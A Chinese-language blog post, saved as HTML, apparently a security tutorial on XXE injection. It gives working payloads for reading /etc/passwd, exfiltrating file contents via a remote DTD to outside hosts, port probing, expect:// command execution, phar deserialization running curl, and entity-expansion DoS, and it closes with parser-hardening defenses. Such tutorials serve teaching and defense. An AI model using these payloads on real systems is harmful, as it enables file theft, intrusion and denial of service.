@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>xxe外部实体注入漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XXE外部实体注入漏洞一、XML格式解析XML是一种非常流行的标记语言，它通常应用于配置文件。XML文档有自己的格式规范，它由DTD(Document Type Definition)进行控制。 DTD可以包含在XML源文件中，也可以包含在其他文件中，通常定义的方式为： 12345678910&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE not">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe外部实体注入漏洞">
+<meta property="og:url" content="http://example.com/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XXE外部实体注入漏洞一、XML格式解析XML是一种非常流行的标记语言，它通常应用于配置文件。XML文档有自己的格式规范，它由DTD(Document Type Definition)进行控制。 DTD可以包含在XML源文件中，也可以包含在其他文件中，通常定义的方式为： 12345678910&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE not">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220104209699.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220103322811.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220105105341.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220111834742.png">
+<meta property="article:published_time" content="2022-08-10T07:31:26.000Z">
+<meta property="article:modified_time" content="2022-08-10T07:31:26.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220104209699.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XXE外部实体注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-08-10T07:31:26.000Z" itemprop="datePublished">2022-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      xxe外部实体注入漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XXE外部实体注入漏洞"><a href="#XXE外部实体注入漏洞" class="headerlink" title="XXE外部实体注入漏洞"></a>XXE外部实体注入漏洞</h1><h2 id="一、XML格式解析"><a href="#一、XML格式解析" class="headerlink" title="一、XML格式解析"></a>一、XML格式解析</h2><p><code>XML</code>是一种非常流行的标记语言，它通常应用于配置文件。<code>XML</code>文档有自己的格式规范，它由<code>DTD(Document Type Definition)</code>进行控制。</p>
+<p><code>DTD</code>可以包含在<code>XML</code>源文件中，也可以包含在其他文件中，通常定义的方式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ELEMENT note (to,from)&gt;</span><br><span class="line">	&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;m1sn0w&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;m1sn0w&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>ELEMENT</code>用于定义元素，上面表示定义了元素的子元素以及各个元素的类型。</p>
+<p>元素的类型主要有两种，一种是<code>#PCDATA</code>，另外一种是<code>#CDATA</code>，两种的区别是前者会进行解析文本，展开实体检查标记，后者表示纯当作字符串进行处理。类比常见的高级语言编程，双引号里面会解析变量，而单引号里面会被直接当成字符串。</p>
+<p>如果需要包含外部的<code>DTD</code>，格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYE note SYSTEM &quot;external.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;m1sn0w&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;m1sn0w&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># external.dtd文件内容如下：</span><br><span class="line">&lt;!ELEMENT note (to,from)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单理解一下，就是将内部引入的<code>[]</code>中的内容替换成了<code>SYSTEM &quot;external.dtd&quot;</code>中的内容。</p>
+<p>对于<code>XXE</code>漏洞来说，关键部分就是实体声明部分。实体的定义，即<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>，也就是说，实体是一个变量。分为内部实体和外部实体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 内部实体</span><br><span class="line">&lt;!ENTITY element &quot;m1sn0w&quot;&gt;</span><br><span class="line">&lt;a&gt;&amp;element;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当需要在标签中进行引用实体的时候，需要用到<code>&amp;+实体名+；</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 外部实体</span><br><span class="line">&lt;!ENTITY element SYSTEM &quot;http://xxx/1.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>除了上述的实体引入外，还可以使用参数实体，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % element SYSTEM &quot;http://xxx/1.dtd&quot;&gt;</span><br><span class="line">&lt;a&gt;%element;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、外部实体注入"><a href="#二、外部实体注入" class="headerlink" title="二、外部实体注入"></a>二、外部实体注入</h2><p><code>XXE</code>漏洞主要利用的就是引入外部实体的方式，<code>XML</code>协议的支持如下：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220104209699.png" alt="image-20211220104209699"></p>
+<h3 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h3><h4 id="（1）有回显的读取敏感文件"><a href="#（1）有回显的读取敏感文件" class="headerlink" title="（1）有回显的读取敏感文件"></a>（1）有回显的读取敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-16&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE m1sn0w [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;file:///etc/passswd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;m1sn0w&gt;&amp;file;&lt;/m1sn0w&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    在某些情况下，一些敏感文件中含有一些特殊的字符，例如<code>&gt;</code>，<code>&lt;</code>，<code>&amp;</code>等，这个时候如果直接对其进行外部引用，可能会导致<code>XML</code>解析出错，为了避免这种情况，可以使用<code>CDATA</code>，也就是将引用的外部文件都只当成字符串，而不去解析运行，这样就可以达到文件读取的目的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 通常CDATA数据的格式为：</span><br><span class="line">&lt;![CDATA[&quot;xxxxxx&quot;]]&gt;</span><br><span class="line"></span><br><span class="line"># 敏感文件读取payload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE m1sn0w [</span><br><span class="line">	&lt;!ENTITY % a &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % b SYSTEM &quot;file:///file&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % c &quot;]]&gt;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % d SYSTEM &quot;http://ip/a.dtd&quot;&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;m1sn0w&gt;&amp;all;&lt;/m1sn0w&gt;</span><br><span class="line"></span><br><span class="line"># a.dtd文件内容为</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%a;%b;%c;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里主要是有一个拼接，利用<code>CDATA</code>来获取字符串，再次加载到本地<code>DTD</code>中，然后进行一个引用。</p>
+<h4 id="（2）无回显读取本地敏感文件"><a href="#（2）无回显读取本地敏感文件" class="headerlink" title="（2）无回显读取本地敏感文件"></a>（2）无回显读取本地敏感文件</h4><p>​    在某些情况下，可能我们可以加载外部实体，但是页面没有回显。此时想要读取文件内容，有一个方法就是将数据外带。利用<code>XXE</code>向外部发送请求，同时将读取到的内容发送至远程服务端。</p>
+<p>​    但由于在同一个<code>xml</code>文件中，在内部实体定义中去引用另外一个参数实体是不允许的，也就是下面这种情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://148.70.205.134:8080/%file;&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    采用嵌套的方式也是不允许的，因为在实体定义中不允许使用参数实体。（和上面的原理相同）</p>
+<p>​    因此在这种情况下，我们可以考虑利用远程加载的方式，来构造实体，从而将数据外带。我们在自己的服务器上创建一个<code>evil.dtd</code>文件，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://rpiyhq.dnslog.cn/?%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    然后我在存在<code>XXE</code>漏洞的地方构造如下<code>Payload</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://101.37.118.41/test.dtd&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;send;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    然后就可以收到发送出去的请求数据，这样也就将读取的文件外带出去了。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220103322811.png" alt="image-20211220103322811"></p>
+<h3 id="2、内网端口探测"><a href="#2、内网端口探测" class="headerlink" title="2、内网端口探测"></a>2、内网端口探测</h3><p>​    由于<code>XML</code>支持<code>http</code>协议，可以利用此方式去探测内网开启的端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    根据页面的返回时间，就可以判断哪些端口开放了，哪些端口关闭了。</p>
+<h3 id="3、远程命令执行"><a href="#3、远程命令执行" class="headerlink" title="3、远程命令执行"></a>3、远程命令执行</h3><p>​    在某些特殊情况下，利用<code>XXE</code>漏洞，也可以进行远程命令执行。比如我们需要开启<code> PHP expect</code>模块，通过加载该模块来进行<code>RCE</code>，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;file;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220105105341.png" alt="image-20211220105105341"></p>
+<h3 id="4、反序列化漏洞利用"><a href="#4、反序列化漏洞利用" class="headerlink" title="4、反序列化漏洞利用"></a>4、反序列化漏洞利用</h3><p>​    由于在<code>php</code>环境下，<code>XML</code>支持了<code>phar</code>协议，那么有没有可能存在反序列化漏洞呢？我在本地做了一个尝试，构造一个类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class target&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system(&#x27;curl http://148.70.205.134:8080/phar&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    然后我们利用如下代码生成一个<code>phar</code>文件，将其上传至目标服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class target&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo 123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new target();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    然后在存在<code>XXE</code>漏洞的地方利用<code>phar</code>协议，去包含这个文件。可以发现最后执行了<code>system</code>命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;phar:///app/phar.phar&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;file;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220111834742.png" alt="image-20211220111834742"></p>
+<h3 id="5、发起SSRF攻击"><a href="#5、发起SSRF攻击" class="headerlink" title="5、发起SSRF攻击"></a>5、发起<code>SSRF</code>攻击</h3><p>​        该攻击的利用方式和内网端口探测的方式一样，只不过可以让服务器去发送<code>payload</code>请求。对于一些只需要<code>GET</code>方法就可以触发的漏洞，我们可以利用<code>XXE</code>发起<code>SSRF</code>攻击从而完成漏洞利用。</p>
+<h3 id="6、DDOS攻击"><a href="#6、DDOS攻击" class="headerlink" title="6、DDOS攻击"></a>6、<code>DDOS</code>攻击</h3><p>​    前面在介绍无回显读取本地敏感文件的时候，有提到过，实体的定义中不能使用参数实体，但是我们可以包含这样的实体<code>$nane;</code>，因此可以利用这样的方式去构造一个<code>payload</code>，不断的消耗服务器的资源：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    这样不断地迭代，最后的数据量会特别大，从而导致了目标服务器的资源被耗尽，也就到了<code>DDOS</code>攻击的目的。</p>
+<h2 id="三、XXE漏洞防御"><a href="#三、XXE漏洞防御" class="headerlink" title="三、XXE漏洞防御"></a>三、<code>XXE</code>漏洞防御</h2><ol>
+<li>从开发语言的角度来进行配置，禁用外部实体的引入：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>对用户提交的数据进行一个简单的过滤，例如<code>ENTITY</code>字段等。</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl8h1i72j00060bdp91bl0zqr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
